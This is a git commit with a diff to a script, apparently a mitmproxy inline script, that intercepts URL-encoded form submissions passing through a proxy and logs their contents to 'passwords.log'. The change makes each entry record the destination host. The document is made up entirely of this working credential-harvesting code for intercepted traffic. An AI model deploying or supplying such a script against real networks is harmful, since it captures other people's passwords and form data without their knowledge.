f29c7ac2f07f7dc02191df853d6d7fcf369c29c4
Kostis Karantias <karantiaskostis@gmail.com>
2015-03-03 20:09:48 +0200

    Log which host the form is directed for

--- scripts/report_form_submissions.py
+++ scripts/report_form_submissions.py
@@ -4,8 +4,7 @@ logging.basicConfig(filename="passwords.log", level=logging.INFO)
     
 def request(context, flow):
     if "application/x-www-form-urlencoded" in flow.request.headers["content-type"]:
-        logging.info("New form submission")
-        logging.info(str(flow.live.c.server_conn))
+        logging.info("Form submission for %s" % flow.request.pretty_host(hostheader=True))
         form = flow.request.get_form_urlencoded()
         logging.info(str(form))
         flow.request.set_form_urlencoded(form)
